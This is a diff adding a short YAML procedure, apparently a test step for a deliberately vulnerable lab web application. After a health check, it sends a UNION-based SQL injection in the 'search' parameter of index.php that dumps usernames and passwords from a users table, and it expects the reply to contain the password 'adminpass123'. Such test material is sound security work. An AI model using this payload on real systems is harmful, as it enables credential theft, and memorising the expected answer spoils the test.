@@ -1,0 +1,28 @@
+- entity_id: sqli_credential_dump
+  procedure:
+    sessions: []
+    procedure:
+    - step_id: verify_app_running
+      session: null
+      action:
+        type: http_request
+        method: GET
+        url: http://${target_host}:${target_port}/index.php
+        headers: {}
+        body: null
+      expect:
+        status: 200
+      outputs: {}
+      timeout: 10
+    - step_id: exploit_sqli_union
+      session: null
+      action:
+        type: http_request
+        method: GET
+        url: http://${target_host}:${target_port}/index.php?search=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-
+        headers: {}
+        body: null
+      expect:
+        body_contains: adminpass123
+      outputs: {}
+      timeout: 10
